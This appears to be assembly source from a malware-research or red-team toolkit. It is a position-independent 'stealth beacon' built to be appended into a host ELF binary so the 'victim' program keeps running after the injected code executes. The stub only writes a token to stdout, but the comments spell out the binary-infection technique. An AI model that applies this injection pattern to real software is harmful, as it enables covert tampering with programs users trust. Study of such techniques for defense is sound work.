; beacon_linux.asm — x86-64 SysV PIC *stealth* beacon (no imports, no libc).
;
;   The host-coupling variant of the linux payload. Unlike payload_linux.asm
;   it does NOT exit: it is a proper function that saves every general
;   purpose register (the kernel hands the new image its entry in RDI=argc,
;   RSI=argv, RDX=envp, RCX=auxv — clobbering any of them before the host's
;   _start runs would break the process), writes a beacon token on fd 1,
;   restores everything, and `ret`s so the host program continues as if
;   nothing happened. That is the whole stealth contract: the victim binary
;   still does its job, with the malware's work already done.
;
;   Position-independent: one RIP-relative `lea`, so it can be appended at
;   any address inside a host ELF (see tools/append_elf.py) and still work.
;
;   assemble: nasm -g -f bin -o build/beacon_linux.bin beacon_linux.asm

bits 64

beacon_linux:
    push rax
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    lea  rsi, [rel msg]    ; explicit RIP-relative -> PIC from any base
    mov  rdi, 1            ; fd = stdout
    mov  rdx, msglen
    mov  rax, 1            ; SYS_write
    syscall

    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  r11
    pop  r10
    pop  r9
    pop  r8
    pop  rbp
    pop  rdi
    pop  rsi
    pop  rbx
    pop  rdx
    pop  rcx
    pop  rax
    ret

msg:    db  "sleepmask: coupled | linux x86-64 | host continues", 0x0a
msglen  equ $ - msg
